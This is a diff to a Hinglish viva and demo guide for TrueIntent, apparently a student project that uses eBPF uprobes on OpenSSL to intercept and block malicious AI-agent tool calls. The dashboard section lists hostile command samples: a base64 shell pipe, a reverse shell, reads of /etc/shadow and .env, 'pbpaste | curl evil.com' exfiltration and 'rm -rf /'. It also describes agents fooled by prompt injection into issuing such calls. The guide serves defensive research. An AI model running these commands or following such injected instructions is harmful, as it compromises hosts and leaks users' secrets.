@@ -19,6 +19,9 @@
 11. [10-Slide PPT Presentation Structure](#11-10-slide-ppt-presentation-structure)
 12. [Top Viva & Examiner Q&A Defense](#12-top-viva--examiner-qa-defense)
 13. [OS & Technology Defense: Why Linux, What About Windows, & Windows Alternatives](#13-os--technology-defense-why-linux-what-about-windows--windows-alternatives)
+14. [Deep Dive: Uprobes, SSL_write aur SSL_read (Hinglish Guide)](#14-deep-dive-uprobes-ssl_write-aur-ssl_read-hinglish-guide)
+15. [Dashboard Components Breakdown: Kaunsa Component Kya Kaam Karta Hai?](#15-dashboard-components-breakdown-kaunsa-component-kya-kaam-karta-hai)
+16. [External Evaluator Live Demo Script (5-Minute Step-by-Step Flow with Dialogues)](#16-external-evaluator-live-demo-script-5-minute-step-by-step-flow-with-dialogues)
 
 ---
 
@@ -317,6 +320,165 @@ If an examiner asks: *"What mechanisms exist inside Windows to do something simi
 
 ### Summary Punchline for Judges:
 > *"Windows is primarily a developer's desktop UI, but Linux is the undisputed backbone of AI agent infrastructure. By building on native Linux eBPF, we target where production agents actually run, while Windows developers seamlessly run TrueIntent today via WSL2 and Docker containers."*
+
+---
+
+## 14. Deep Dive: Uprobes, SSL_write aur SSL_read (Hinglish Guide)
+
+### A. Uprobes (User-Space Probes) Kya Hote Hain?
+* Linux me **eBPF** do tarah ke probes deta hai:
+  1. **Kprobes (Kernel Probes):** Linux Kernel ke internal functions (jaise `sys_clone`, `tcp_sendmsg`) ko trace karte hain.
+  2. **Uprobes (User-space Probes):** User space me chalne wali application aur dynamic shared libraries (jaise `libssl.so`, `libc.so`) ke functions ko trace karte hain.
+* **Internal Working Mechanism:**
+  * Jab hum Linux me eBPF Uprobe attach karte hain, toh Linux Kernel target library (`libssl.so`) ke function ke pehle byte par ek microscopic **breakpoint instruction (`int3` on x86)** inject kar deta hai.
+  * Jab bhi AI Agent ya Python application us function ko call karta hai, CPU turant control Linux kernel ke eBPF sandbox program ko handover kar deta hai.
+  * Hamara eBPF program function ke arguments (pointers to data buffers) ko safe tarike se copy karke **eBPF Ring Buffer** me push kar deta hai.
+  * Uske baad execution normal speed par continue hoti hai.
+  * **Sabse bada advantage:** Hamne na toh Python ko chhua, na AI agent ka code badla, na OpenSSL ko recompile kiya — zero-instrumentation kernel observation!
+
+---
+
+### B. `SSL_write` aur `SSL_read` Kya Hote Hain?
+OpenSSL (`libssl.so`) dunia ki sabse standard cryptographic library hai. Python ka `requests`, `urllib`, Node.js, ya koi bhi AI Agent jab HTTPS request bhejta hai, wo OpenSSL ke do primary C-functions call karta hai:
+
+#### 1. `int SSL_write(SSL *ssl, const void *buf, int num);`
+* **Function ka Role:** Ye function application se data lekar use encrypt karta hai aur network socket par bhejta hai.
+* **Hamara Hook:** Humne `SSL_write` ke **entry point** par Uprobe lagaya hai.
+* **Technical Secret:** Jab application `buf` pointer pass karti hai, **wo data unencrypted plaintext hota hai (raw JSON-RPC)**! Encrypt hone se theek pehle, hamara eBPF code unencrypted MCP tool call (`{"method": "tools/call", "params": {"name": "execute_command", ...}}`) ko microsecond ke andar capture kar leta hai.
+
+#### 2. `int SSL_read(SSL *ssl, void *buf, int num);`
+* **Function ka Role:** Ye function network socket se encrypted bytes receive karke decrypt karta hai aur application ko provide karta hai.
+* **Hamara Hook:** Humne `SSL_read` ke **return point (uretprobe)** par hook lagaya hai.
+* **Technical Secret:** Decryption routine complete hone ke theek baad `buf` me plaintext response aa jata hai. Hum isse inspect karke server ke outputs, sensitive leaks aur multi-turn responses ko analyze karte hain.
+
+> **💡 Winning Examiner Punchline:**  
+> *"Sir, traditional firewalls network wire par packet pakadne ki koshish karte hain jahan sab kuch TLS-encrypted hota hai. Hum wire par packet decrypt karne ka jhamela nahi karte; hum user memory ke andar `SSL_write()` ke entry point par Uprobe lagate hain jahan data encrypt hone se pehle natural plaintext form me hota hai. Isliye bina kisi SSL certificate ya MITM proxy ke hum 100% genuine traffic inspect kar pate hain!"*
+
+---
+
+## 15. Dashboard Components Breakdown: Kaunsa Component Kya Kaam Karta Hai?
+
+Aapka frontend developer-grade **editorial glassmorphic dashboard** hai. Har component ka ek specific technical purpose hai:
+
+### 1. Top Navigation Bar & Engine Switcher
+* **Live Flow, Kernel Lab, Telemetry:** Page ke specific sections par jump karne ke liye smooth scroll navigation.
+* **Compare Button (`/compare`):** Ek click par split-screen side-by-side Before vs After attack simulator kholta hai.
+* **Model Dropdown (Qwen 27B LPU / GPT-OSS 120B / GPT-OSS 20B):** Groq LPU ka inference engine switch karne ke liye. Examiner ko dikhata hai ki system multi-model compatible hai.
+* **eBPF Hook Badge (`libssl.so:SSL_write`):** Real-time pulse indicator jo batata hai ki Linux kernel uprobe live listening state me hai.
+
+### 2. Live Threat Level Dial (Speedometer Arc)
+* Top right me animated circular threat meter hai.
+* Normal state me **LEVEL 0: CALM (Zero Anomalies)** green rehta hai.
+* Attack detect hote hi ye animate hokar **LEVEL 3: CRITICAL ALERT** par crimson-red switch ho jata hai.
+
+### 3. Quick Exploit Trigger Chips (9 Scenarios)
+Examiner ko live demonstration dene ke liye 9 real-world scenarios categorize kiye gaye hain:
+* **Amber Chips ("GROK BYPASSED"):** Wo attacks jahan LLM fool ho gaya aur malicious tool call formulate kar diya:
+  1. *Base64 Shell Pipe (`echo Y2F0... | sh`)*
+  2. *Command Chaining (`/index.html|id|`)*
+  3. *Reverse TCP Shell (`socket.connect(8080)`)*
+  4. *Null Byte LFI (`/etc/passwd%00.png`)*
+  5. *API Key Theft (`read_file env/.env`)*
+  6. *Clipboard Snooping (`pbpaste | curl evil.com`)*
+  7. *Shadow File Read (`read_file /etc/shadow`)*
+* **Purple Chip ("GROK REFUSED"):** Direct harm attack (`sudo rm -rf /`) jahan LLM ke baseline RLHF ne khud command reject kar di (Control baseline).
+* **Emerald Chip ("VERIFIED SAFE"):** Safe diagnostic command (`ping 127.0.0.1`) jo 200 OK ke sath allow hoti hai.
+
+### 4. Interactive 6-Stage Visual Pipeline (Visual Centerpiece)
+Jab bhi koi prompt run hota hai, ek glowing light packet in 6 nodes se pass hota hai:
+1. **AI Agent (LLM):** Groq LPU se tool call formulate hota hai.
+2. **eBPF Sniff:** Kernel boundary par plaintext capture hota hai.
+3. **L1 Policy:** File paths aur tool whitelist check hoti hai (`/etc/shadow` drop).
+4. **L2 Deobf:** Base64, Hex aur quote evasion unmask hoti hai.
+5. **L3 Threat:** Sudo, C2 exfiltration aur reverse shells scan hote hain.
+6. **L4 Drop / MCP Host:** Malicious hai toh L4 par red flame drop, clean hai toh MCP Host par green success.
+* **Dynamic Node Inspector Drawer:** Pipeline ke kisi bhi node par click karne par niche drawer open ho jata hai jo us node ki exact internal state aur verification status batata hai.
+
+### 5. Interactive Kernel Mechanics (4 Live Verification Probes)
+Page ke second half me 4 live labs hain jo backend se directly communicate karti hain:
+* **Probe 01 (Zero-Copy TLS Tap):** Toggle button hai — ek taraf encrypted wire ciphertext (`17 03 03 00 28...`) dikhata hai aur dusri taraf eBPF dwara captured readable JSON-RPC.
+* **Probe 02 (Capability Policy Sandbox):** Custom file path daal kar whitelist/blacklist check kar sakte hain.
+* **Probe 03 (Evasion Deobfuscator):** Custom Base64 ya Hex input daal kar real-time unmasking test kar sakte hain.
+* **Probe 04 (Active Wire Breaker):** Live firewall kill-switch jise arm/disarm kiya ja sakta hai.
+
+---
+
+## 16. External Evaluator Live Demo Script (5-Minute Step-by-Step Flow with Dialogues)
+
+External evaluator/judge ke samne is exact 5-step sequence me live demo execute karein:
+
+```
+[ Step 1: Context & UI Overview ] ──► [ Step 2: Show the TLS Blind Spot (Probe 1) ]
+                                                        │
+[ Step 4: The Hero Attack (Base64 Evasion) ] ◄── [ Step 3: Run Benign Safe Command ]
+               │
+               ▼
+[ Step 5: Open /compare Split Screen ] ──► [ Step 6: 1-Liner Winning Conclusion ]
+```
+
+---
+
+### Step 1: The Hook & Introduction (30 Seconds)
+* **Screen:** Open `http://localhost:5000` (Home page).
+* **Aapko bolna hai:**
+  > *"Sir, ye hamara TrueIntent dashboard hai. Aajkal autonomous AI agents MCP protocol ke through tools call karte hain. Hamne is pure flow ko Linux kernel level par observe aur secure karne ke liye ye platform banaya hai. Top right par aap dekh sakte hain ki hamara eBPF Uprobe `libssl.so` par live hooked hai aur model Groq LPU par chal raha hai."*
+
+---
+
+### Step 2: Show the "TLS Blind Spot" Problem (Probe 1) (45 Seconds)
+* **Action:** Mouse se scroll down karein **"PROBE 01 / MEMORY INTERCEPTION"** par.
+* **Button Click:** Click karein **"🔒 Encrypted Wire"**.
+* **Aapko bolna hai:**
+  > *"Sir, pehle problem dekhiye. Traditional firewalls (iptables ya Palo Alto) jab network wire ko dekhte hain, toh unhe ye encrypted binary ciphertext dikhta hai. Isme pata hi nahi chal sakta ki AI Agent ne kya bheja hai."*
+* **Button Click:** Click karein **"⚡ eBPF Captured"**.
+* **Aapko bolna hai:**
+  > *"Lekin TrueIntent me jab hum eBPF view toggle karte hain, toh hum OpenSSL ke `SSL_write()` se theek pehle unencrypted memory tap kar lete hain. Dekhiye, bina kisi SSL certificate ke pura JSON-RPC tool call crystal-clear readable hai!"*
+
+---
+
+### Step 3: Run a Benign Command (Show Safe Execution) (30 Seconds)
+* **Action:** Scroll up back to Quick Chips. Click karein **"Safe Ping Check"** (`ping 127.0.0.1`).
+* **Visual to Point:**
+  * Animated packet blue line par travel karega.
+  * Node 1 se Node 7 (MCP Host) tak saare nodes **Green** honge.
+  * Verdict banner aayega: **`HTTP 200 OK — Operation Verified Clean`**.
+* **Aapko bolna hai:**
+  > *"Jab legitimate user diagnostic task karta hai (jaise ping), hamara 4-layer engine check karta hai: tool whitelist me hai, koi malicious evasion nahi hai, aur request clean execute ho jati hai in less than 1 millisecond."*
+
+---
+
+### Step 4: The Hero Attack (Disguised Base64 Evasion) (1 Minute)
+* **Action:** Click karein **"Base64 Shell Pipe"** chip (`echo Y2F0... | sh`).
+* **Visual to Point:**
+  * Threat dial instantly switch karega: **`LEVEL 3: CRITICAL ALERT`**.
+  * Chip par **"GROK BYPASSED"** badge dikhayega.
+  * Packet chalega: Node 1 (LLM) pass hua, Node 2 (eBPF) pass hua, Node 4 (L2 Deobfuscator) ne payload unmask kiya, aur **Node 6 (L4 Drop) par Red Cross / Fire Drop** trigger hua!
+  * MCP Host par packet kabhi pohancha hi nahi!
+  * Verdict banner: **`HTTP 403 FORBIDDEN — Blocked at Kernel Boundary`**.
+* **Aapko bolna hai:**
+  > *"Ab dekhiye attack scenario! Attacker ne `cat /etc/shadow` ko Base64 me encode karke bheja tha. Groq AI Agent is se fool ho gaya aur usne command formulate kar di (GROK BYPASSED). 
+  > 
+  > Lekin TrueIntent ke Layer 2 Deobfuscator ne Base64 ko unmask kiya, Layer 3 Threat Inspector ne sensitive shadow file read pakdi, aur Layer 4 Kernel IPS ne connection ko execution se pehle hi **HTTP 403 Drop** kar diya. OS par 0 bytes tamper huye!"*
+
+---
+
+### Step 5: The "Showstopper" — Side-by-Side Comparison (`/compare`) (1 Minute)
+* **Action:** Top nav bar me **"Compare"** button par click karein (ya `/compare` open karein).
+* **Visual to Point:**
+  * Screen split ho jayegi do vertical panels me:
+    * **Left Side (Red):** "Without TrueIntent (Standard Setup)"
+    * **Right Side (Green):** "With TrueIntent (Kernel-Protected)"
+* **Action:** Click karein **"Simulate Attack Trajectory"**.
+* **Aapko bolna hai:**
+  > *"Sir, yahan hamare project ka exact value-add saaf dikhta hai:
+  > - **Left side pe:** Standard setup me agent fool hote hi malicious command host OS par chali gayi, system file leak ho gayi aur server compromise ho gaya.
+  > - **Right side pe:** TrueIntent ke sath, wahi same attack kernel boundary par intercept hua, sub-millisecond (0.7ms) me terminate ho gaya aur host completely safe raha."*
+
+---
+
+### Step 6: Closing Punchline (15 Seconds)
+* **Aapko bolna hai:**
+  > *"Ye evaluate karne ke liye humne Meta CyberSecEval, Microsoft BIPIA aur UIUC InjecAgent ke 50 attacks run kiye. Results ne prove kiya ki AI Agent 52.3% attacks me fool ho jata hai, aur TrueIntent un 100% agent failures ko kernel boundary par zero data loss ke sath block karta hai. Thank you, sir! Any questions?"*
 
 ---
 
